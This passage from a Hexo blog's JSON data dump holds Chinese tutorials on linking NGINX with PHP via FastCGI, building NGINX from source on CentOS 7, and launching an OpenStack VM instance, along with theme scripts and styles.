iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"NGINX整合PHP\"><a href=\"#NGINX整合PHP\" class=\"headerlink\" title=\"NGINX整合PHP\"></a>NGINX整合PHP</h3><p>这个实现起来比较简单，就是一段代码的事，但是之前没有出现我这样的开源工作者的时候，我只能手敲那一段代码，有时候一不留神就会把单词拼错，尤其是朱行查找错误的时候，简直苦不堪言。为了后浪们的幸福生活，再次我将那一段代码写下来供你们<kbd>Ctrl</kbd>+<kbd>C</kbd>和<kbd>Ctrl</kbd>+<kbd>V</kbd>使用。</p>","more":"<p>具体操作如下：</p>\n<ul>\n<li>打开NGINX的配置文件,添加这一段。</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ \\.php$ &#123;</span><br><span class=\"line\">    root   /web;</span><br><span class=\"line\">    fastcgi_pass    127.0.0.1:9000;</span><br><span class=\"line\">    fastcgi_index   index.php;</span><br><span class=\"line\">    fastcgi_param   SCRIPT_FILENAME $document_root<span class=\"variable\">$fastcgi_script_name</span>;</span><br><span class=\"line\">    include         fastcgi_params;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>补一张图片显示要插入的位置。</p>\n<p><img src=\"/2023/07/04/nginx-union-php/1.png\"></p>\n<p>然后就完成了NGINX和PHP的联动。</p>"},{"title":"源码安装NGINX","date":"2023-07-04T02:09:47.000Z","_content":"\n### 安装NGINX\n\n如果是centos8版本的话，可以直接使用本地yum或者网络yum安装NGINX，对于8版本的就不在做过多赘述。\n\n主要针对Centos7版本做一下说明，因为Centos7的yum是不提供NGINX的，所以需要自己手动使用源码安装的方式进行安装。\n\n<!-- more -->\n\n[nginx源码包下载链接](https://pan.baidu.com/s/1hjUud-D1Du-s-dbFAGJxTQ?pwd=46k1)\n\n提取码：46k1\n\n* 解压源码包\n\n```bash\ntar -zxf nginx-1.17.10.tar.gz\n```\n\n* 安装相关的依赖\n\n```bash\nyum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel\n```\n\n* 执行configure脚本\n\n```bash\n./configure --prefix=/usr/local/nginx --with-http_ssl_module\n```\n\n* 再执行两步安装完成\n\n```bash\nmake\nmake install\n```\n\n此时NGINX的启动命令是在`/usr/local/nginx/sbin/nginx`里。\n\n直接执行这条命令可以启动NGINX\n\n```bash\n/usr/local/nginx/sbin/nginx\n```\n\n但是这个命令是在太长了，很不方便，我们可以拷贝一份到系统命令里面。\n\n```bash\ncp /usr/local/nginx/sbin/nginx /sbin/nginx\n```\n\n然后我们就可以愉快地使用一些简单的命令来对NGINX进行管理。\n\n```bash\nnginx # 启动nginx\nnginx -s reload # 重启nginx\nnginx -s stop # 关闭nginx\n```\n\n启动之后，可以通过80端口检查是否处于监听状态\n\n```bash\nlsof -i:80\n```\n\n再补充一点，就是关于NGINX的配置文件，源码安装的NGINX配置文件的路径`cd /usr/local/nginx/conf`里面很多我们不需要的内容，直接一条命令带走他们。\n\n```bash\negrep -v \"^[[:space:]]*#|^$\" nginx.conf.default > nginx.conf\n```\n之后就很清爽了，开始配置吧少年。","source":"_posts/nginx.md","raw":"---\ntitle: 源码安装NGINX\ndate: 2023-07-04 10:09:47\ncategories: 技术\ntags:\n  - Linux\n---\n\n### 安装NGINX\n\n如果是centos8版本的话，可以直接使用本地yum或者网络yum安装NGINX，对于8版本的就不在做过多赘述。\n\n主要针对Centos7版本做一下说明，因为Centos7的yum是不提供NGINX的，所以需要自己手动使用源码安装的方式进行安装。\n\n<!-- more -->\n\n[nginx源码包下载链接](https://pan.baidu.com/s/1hjUud-D1Du-s-dbFAGJxTQ?pwd=46k1)\n\n提取码：46k1\n\n* 解压源码包\n\n```bash\ntar -zxf nginx-1.17.10.tar.gz\n```\n\n* 安装相关的依赖\n\n```bash\nyum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel\n```\n\n* 执行configure脚本\n\n```bash\n./configure --prefix=/usr/local/nginx --with-http_ssl_module\n```\n\n* 再执行两步安装完成\n\n```bash\nmake\nmake install\n```\n\n此时NGINX的启动命令是在`/usr/local/nginx/sbin/nginx`里。\n\n直接执行这条命令可以启动NGINX\n\n```bash\n/usr/local/nginx/sbin/nginx\n```\n\n但是这个命令是在太长了，很不方便，我们可以拷贝一份到系统命令里面。\n\n```bash\ncp /usr/local/nginx/sbin/nginx /sbin/nginx\n```\n\n然后我们就可以愉快地使用一些简单的命令来对NGINX进行管理。\n\n```bash\nnginx # 启动nginx\nnginx -s reload # 重启nginx\nnginx -s stop # 关闭nginx\n```\n\n启动之后，可以通过80端口检查是否处于监听状态\n\n```bash\nlsof -i:80\n```\n\n再补充一点，就是关于NGINX的配置文件，源码安装的NGINX配置文件的路径`cd /usr/local/nginx/conf`里面很多我们不需要的内容，直接一条命令带走他们。\n\n```bash\negrep -v \"^[[:space:]]*#|^$\" nginx.conf.default > nginx.conf\n```\n之后就很清爽了，开始配置吧少年。","slug":"nginx","published":1,"updated":"2024-05-03T03:55:54.881Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5g9007i7zj353mkfnn7","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"安装NGINX\"><a href=\"#安装NGINX\" class=\"headerlink\" title=\"安装NGINX\"></a>安装NGINX</h3><p>如果是centos8版本的话，可以直接使用本地yum或者网络yum安装NGINX，对于8版本的就不在做过多赘述。</p>\n<p>主要针对Centos7版本做一下说明，因为Centos7的yum是不提供NGINX的，所以需要自己手动使用源码安装的方式进行安装。</p>\n<span id=\"more\"></span>\n\n<p><a href=\"https://pan.baidu.com/s/1hjUud-D1Du-s-dbFAGJxTQ?pwd=46k1\">nginx源码包下载链接</a></p>\n<p>提取码：46k1</p>\n<ul>\n<li>解压源码包</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar -zxf nginx-1.17.10.tar.gz</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>安装相关的依赖</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>执行configure脚本</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure --prefix=/usr/local/nginx --with-http_ssl_module</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>再执行两步安装完成</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">make</span><br><span class=\"line\">make install</span><br></pre></td></tr></table></figure>\n\n<p>此时NGINX的启动命令是在<code>/usr/local/nginx/sbin/nginx</code>里。</p>\n<p>直接执行这条命令可以启动NGINX</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/local/nginx/sbin/nginx</span><br></pre></td></tr></table></figure>\n\n<p>但是这个命令是在太长了，很不方便，我们可以拷贝一份到系统命令里面。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cp</span> /usr/local/nginx/sbin/nginx /sbin/nginx</span><br></pre></td></tr></table></figure>\n\n<p>然后我们就可以愉快地使用一些简单的命令来对NGINX进行管理。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx <span class=\"comment\"># 启动nginx</span></span><br><span class=\"line\">nginx -s reload <span class=\"comment\"># 重启nginx</span></span><br><span class=\"line\">nginx -s stop <span class=\"comment\"># 关闭nginx</span></span><br></pre></td></tr></table></figure>\n\n<p>启动之后，可以通过80端口检查是否处于监听状态</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsof -i:80</span><br></pre></td></tr></table></figure>\n\n<p>再补充一点，就是关于NGINX的配置文件，源码安装的NGINX配置文件的路径<code>cd /usr/local/nginx/conf</code>里面很多我们不需要的内容，直接一条命令带走他们。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">egrep -v <span class=\"string\">&quot;^[[:space:]]*#|^$&quot;</span> nginx.conf.default &gt; nginx.conf</span><br></pre></td></tr></table></figure>\n<p>之后就很清爽了，开始配置吧少年。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"安装NGINX\"><a href=\"#安装NGINX\" class=\"headerlink\" title=\"安装NGINX\"></a>安装NGINX</h3><p>如果是centos8版本的话，可以直接使用本地yum或者网络yum安装NGINX，对于8版本的就不在做过多赘述。</p>\n<p>主要针对Centos7版本做一下说明，因为Centos7的yum是不提供NGINX的，所以需要自己手动使用源码安装的方式进行安装。</p>","more":"<p><a href=\"https://pan.baidu.com/s/1hjUud-D1Du-s-dbFAGJxTQ?pwd=46k1\">nginx源码包下载链接</a></p>\n<p>提取码：46k1</p>\n<ul>\n<li>解压源码包</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar -zxf nginx-1.17.10.tar.gz</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>安装相关的依赖</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>执行configure脚本</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure --prefix=/usr/local/nginx --with-http_ssl_module</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>再执行两步安装完成</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">make</span><br><span class=\"line\">make install</span><br></pre></td></tr></table></figure>\n\n<p>此时NGINX的启动命令是在<code>/usr/local/nginx/sbin/nginx</code>里。</p>\n<p>直接执行这条命令可以启动NGINX</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/local/nginx/sbin/nginx</span><br></pre></td></tr></table></figure>\n\n<p>但是这个命令是在太长了，很不方便，我们可以拷贝一份到系统命令里面。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cp</span> /usr/local/nginx/sbin/nginx /sbin/nginx</span><br></pre></td></tr></table></figure>\n\n<p>然后我们就可以愉快地使用一些简单的命令来对NGINX进行管理。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx <span class=\"comment\"># 启动nginx</span></span><br><span class=\"line\">nginx -s reload <span class=\"comment\"># 重启nginx</span></span><br><span class=\"line\">nginx -s stop <span class=\"comment\"># 关闭nginx</span></span><br></pre></td></tr></table></figure>\n\n<p>启动之后，可以通过80端口检查是否处于监听状态</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsof -i:80</span><br></pre></td></tr></table></figure>\n\n<p>再补充一点，就是关于NGINX的配置文件，源码安装的NGINX配置文件的路径<code>cd /usr/local/nginx/conf</code>里面很多我们不需要的内容，直接一条命令带走他们。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">egrep -v <span class=\"string\">&quot;^[[:space:]]*#|^$&quot;</span> nginx.conf.default &gt; nginx.conf</span><br></pre></td></tr></table></figure>\n<p>之后就很清爽了，开始配置吧少年。</p>"},{"title":"在OpenStack上分发虚拟机实例","date":"2023-04-23T06:23:00.000Z","_content":"\n### 镜像\n\nOpenStack的存放镜像的位置在image目录下，作为演示，我们待会就使用这个cirros镜像。\n\n![镜像](https://lxp731.github.io/img/openstack/images.png)\n\n### 规格\n\nOpenStack分发虚拟机时，可以自定义一个分发的模板，这个模板就在flavors目录下，此时还是空，我们先创建一个flavor。\n\n<!-- more -->\n\n![模板](https://lxp731.github.io/img/openstack/flavors.png)\n\n按照自己的需求，可以创建flavor模板\n\n| | |\n|:--|:--|\n|VCPU|虚拟CPU的数量|\n|ID|默认就好|\n|RAM|内存大小|\n|ROOT DISK|根磁盘大小|\n|其他选项|全部默认|\n\n![flavor](https://lxp731.github.io/img/openstack/create_flavors.png)\n\n创建好之后，就会生成这样的一个flavor。\n\n![flavor](https://lxp731.github.io/img/openstack/succeed_flavors.png)\n\n### 网络\n\n和分发规格一样，我们同时可以自定义网络的模板,默认是会存在一个模板的，我们使用默认的模板，不再进行创建新的模板了，当然你可以按照个人的需求进行创建。\n\n![network](https://lxp731.github.io/img/openstack/network.png)\n\n### 发放虚拟机实例\n\n我们到project的instances目录，这里还没有虚拟机实例，我们来创建一个。\n\n![network](https://lxp731.github.io/img/openstack/instances.png)\n\n1. 点击右上角的```launch instances```。\n\n2. 设置details，名字自己起，描述选填，其他默认就好，然后next。\n\n![network](https://lxp731.github.io/img/openstack/details.png)\n\n3. 设置source，为了节省空间我选择不再创建新的卷，然后将下面的模板直接应用，点旁边的上箭头应用，然后next。\n\n![network](https://lxp731.github.io/img/openstack/source.png)\n\n4. 设置flavor，这里有我们刚刚创建的flavor模板，我们直接点旁边的上箭头。\n\n![network](https://lxp731.github.io/img/openstack/flavor.png)\n\n5. 最后设置network，默认已经选好了。那么，计算资源，存储资源，网络资源我们都配置好了，就可以直接发布虚拟机了，点击右下角的按钮分发实例。\n\n6. 稍作等待，就会出现下面这个页面，等实例处于active时，就大功告成了。\n\n![network](https://lxp731.github.io/img/openstack/finish.png)","source":"_posts/openstack-deploy.md","raw":"---\ntitle: 在OpenStack上分发虚拟机实例\ndate:       2023-04-23 14:23\ncategories:\n  - 探索\ntags: \n    - Openstack\n---\n\n### 镜像\n\nOpenStack的存放镜像的位置在image目录下，作为演示，我们待会就使用这个cirros镜像。\n\n![镜像](https://lxp731.github.io/img/openstack/images.png)\n\n### 规格\n\nOpenStack分发虚拟机时，可以自定义一个分发的模板，这个模板就在flavors目录下，此时还是空，我们先创建一个flavor。\n\n<!-- more -->\n\n![模板](https://lxp731.github.io/img/openstack/flavors.png)\n\n按照自己的需求，可以创建flavor模板\n\n| | |\n|:--|:--|\n|VCPU|虚拟CPU的数量|\n|ID|默认就好|\n|RAM|内存大小|\n|ROOT DISK|根磁盘大小|\n|其他选项|全部默认|\n\n![flavor](https://lxp731.github.io/img/openstack/create_flavors.png)\n\n创建好之后，就会生成这样的一个flavor。\n\n![flavor](https://lxp731.github.io/img/openstack/succeed_flavors.png)\n\n### 网络\n\n和分发规格一样，我们同时可以自定义网络的模板,默认是会存在一个模板的，我们使用默认的模板，不再进行创建新的模板了，当然你可以按照个人的需求进行创建。\n\n![network](https://lxp731.github.io/img/openstack/network.png)\n\n### 发放虚拟机实例\n\n我们到project的instances目录，这里还没有虚拟机实例，我们来创建一个。\n\n![network](https://lxp731.github.io/img/openstack/instances.png)\n\n1. 点击右上角的```launch instances```。\n\n2. 设置details，名字自己起，描述选填，其他默认就好，然后next。\n\n![network](https://lxp731.github.io/img/openstack/details.png)\n\n3. 设置source，为了节省空间我选择不再创建新的卷，然后将下面的模板直接应用，点旁边的上箭头应用，然后next。\n\n![network](https://lxp731.github.io/img/openstack/source.png)\n\n4. 设置flavor，这里有我们刚刚创建的flavor模板，我们直接点旁边的上箭头。\n\n![network](https://lxp731.github.io/img/openstack/flavor.png)\n\n5. 最后设置network，默认已经选好了。那么，计算资源，存储资源，网络资源我们都配置好了，就可以直接发布虚拟机了，点击右下角的按钮分发实例。\n\n6. 稍作等待，就会出现下面这个页面，等实例处于active时，就大功告成了。\n\n![network](https://lxp731.github.io/img/openstack/finish.png)","slug":"openstack-deploy","published":1,"updated":"2024-05-03T03:55:54.881Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5ga007l7zj3aputekm5","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"镜像\"><a href=\"#镜像\" class=\"headerlink\" title=\"镜像\"></a>镜像</h3><p>OpenStack的存放镜像的位置在image目录下，作为演示，我们待会就使用这个cirros镜像。</p>\n<p><img src=\"https://lxp731.github.io/img/openstack/images.png\" alt=\"镜像\"></p>\n<h3 id=\"规格\"><a href=\"#规格\" class=\"headerlink\" title=\"规格\"></a>规格</h3><p>OpenStack分发虚拟机时，可以自定义一个分发的模板，这个模板就在flavors目录下，此时还是空，我们先创建一个flavor。</p>\n<span id=\"more\"></span>\n\n<p><img src=\"https://lxp731.github.io/img/openstack/flavors.png\" alt=\"模板\"></p>\n<p>按照自己的需求，可以创建flavor模板</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\"></th>\n<th align=\"left\"></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">VCPU</td>\n<td align=\"left\">虚拟CPU的数量</td>\n</tr>\n<tr>\n<td align=\"left\">ID</td>\n<td align=\"left\">默认就好</td>\n</tr>\n<tr>\n<td align=\"left\">RAM</td>\n<td align=\"left\">内存大小</td>\n</tr>\n<tr>\n<td align=\"left\">ROOT DISK</td>\n<td align=\"left\">根磁盘大小</td>\n</tr>\n<tr>\n<td align=\"left\">其他选项</td>\n<td align=\"left\">全部默认</td>\n</tr>\n</tbody></table>\n<p><img src=\"https://lxp731.github.io/img/openstack/create_flavors.png\" alt=\"flavor\"></p>\n<p>创建好之后，就会生成这样的一个flavor。</p>\n<p><img src=\"https://lxp731.github.io/img/openstack/succeed_flavors.png\" alt=\"flavor\"></p>\n<h3 id=\"网络\"><a href=\"#网络\" class=\"headerlink\" title=\"网络\"></a>网络</h3><p>和分发规格一样，我们同时可以自定义网络的模板,默认是会存在一个模板的，我们使用默认的模板，不再进行创建新的模板了，当然你可以按照个人的需求进行创建。</p>\n<p><img src=\"https://lxp731.github.io/img/openstack/network.png\" alt=\"network\"></p>\n<h3 id=\"发放虚拟机实例\"><a href=\"#发放虚拟机实例\" class=\"headerlink\" title=\"发放虚拟机实例\"></a>发放虚拟机实例</h3><p>我们到project的instances目录，这里还没有虚拟机实例，我们来创建一个。</p>\n<p><img src=\"https://lxp731.github.io/img/openstack/instances.png\" alt=\"network\"></p>\n<ol>\n<li><p>点击右上角的<code>launch instances</code>。</p>\n</li>\n<li><p>设置details，名字自己起，描述选填，其他默认就好，然后next。</p>\n</li>\n</ol>\n<p><img src=\"https://lxp731.github.io/img/openstack/details.png\" alt=\"network\"></p>\n<ol start=\"3\">\n<li>设置source，为了节省空间我选择不再创建新的卷，然后将下面的模板直接应用，点旁边的上箭头应用，然后next。</li>\n</ol>\n<p><img src=\"https://lxp731.github.io/img/openstack/source.png\" alt=\"network\"></p>\n<ol start=\"4\">\n<li>设置flavor，这里有我们刚刚创建的flavor模板，我们直接点旁边的上箭头。</li>\n</ol>\n<p><img src=\"https://lxp731.github.io/img/openstack/flavor.png\" alt=\"network\"></p>\n<ol start=\"5\">\n<li><p>最后设置network，默认已经选好了。那么，计算资源，存储资源，网络资源我们都配置好了，就可以直接发布虚拟机了，点击右下角的按钮分发实例。</p>\n</li>\n<li><p>稍作等待，就会出现下面这个页面，等实例处于active时，就大功告成了。</p>\n</li>\n</ol>\n<p><img src=\"https://lxp731.github.io/img/openstack/finish.png\" alt=\"network\"></p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"镜像\"><a href=\"#镜像\" class=\"headerlink\" title=\"镜像\"></a>镜像</h3><p>OpenStack的存放镜像的位置在image目录下，作为演示，我们待会就使用这个cirros镜像。</p>\n<p><img src=\"https://lxp731.github.io/img/openstack/images.png\" alt=\"镜像\"></p>\n<h3 id=\"规格\"><a href=\"#规格\" class=\"headerlink\" title=\"规格\"></a>规格</h3><p>OpenStack分发虚拟机时，可以自定义一个分发的模板，这个模板就在flavors目录下，此时还是空，我们先创建一个flavor。</p>","more":"<p><img src=\"https://lxp731.github.io/img/openstack/flavors.png\" alt=\"模板\"></p>\n<p>按照自己的需求，可以创建flavor模板</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\"></th>\n<th align=\"left\"></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">VCPU</td>\n<td align=\"left\">虚拟CPU的数量</td>\n</tr>\n<tr>\n<td align=\"left\">ID</td>\n<td 